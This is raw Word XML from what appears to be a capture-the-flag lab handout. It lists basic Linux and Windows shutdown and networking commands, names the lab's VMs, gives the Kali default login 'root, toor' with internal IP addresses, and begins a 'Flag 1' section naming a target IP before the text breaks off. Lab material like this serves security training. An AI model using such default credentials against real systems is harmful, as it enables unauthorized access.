          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is cas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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2"/>
          <w:position w:val="-1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4"/>
          <w:szCs w:val="24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-1"/>
          <w:position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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>itive!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1666" w:right="1282"/>
        <w:jc w:val="center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Lin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u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x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mm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and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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2064"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="131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poweroff</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/>
        <w:ind w:left="2064"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="131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reboot</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/>
        <w:ind w:left="2064" w:right="-56"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="131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ip a (or ifconfig)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="1" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="-38" w:right="4728"/>
        <w:jc w:val="center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Windo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w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mm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and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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="131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shutdown /s /t 0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="131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shutdown /r /t 0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:spacing w:before="35"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="600" w:right="0" w:bottom="280" w:left="0" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="4801" w:space="526"/>
            <w:col w:w="6913"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:group id="_x0000_s1117" style="position:absolute;left:0;text-align:left;margin-left:75.75pt;margin-top:558.9pt;width:457.25pt;height:150.6pt;z-index:-1896;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" coordorigin="1515,11178" coordsize="9145,3012">
            <v:shape id="_x0000_s1118" style="position:absolute;left:1515;top:11178;width:9145;height:3012" coordorigin="1515,11178" coordsize="9145,3012" path="m1515,14190r9145,l10660,11178r-9145,l1515,14190xe" filled="f" strokecolor="#a17142" strokeweight="4.5pt">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ipconfig</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762AE6">
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>6 VMs: (root, toor), Right Ctrl + F to release the mouse from VM.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762AE6">
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>dev</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762AE6">
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>jumpbox</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762AE6">
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>fw1(firewall 1)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762AE6">
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xray</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762AE6">
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>kali-2025</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762AE6">
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>deanna-pc</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762AE6">
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>dev(172.3.1.11), jumpbox(172.31.1.10/24), fw1(eth0: 10.0.0.80/24,eth1: 172.31.1.1/24 ) :</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762AE6">
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ifconfig(get ip address)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762AE6">
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>reboot</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762AE6">
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>--------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762AE6">
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Flag 1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRPr="00762AE6" w:rsidRDefault="00762AE6" w:rsidP="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762AE6">
        <w:rPr>
          <w:rFonts w:eastAsia="Franklin Gothic Medium"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>here target ip is 10.0.0.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00762AE6" w:rsidRDefault="00762AE6">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Flag 1 –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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Po</w:t>
      </w:r>
      <w:r>
        <w:rPr>
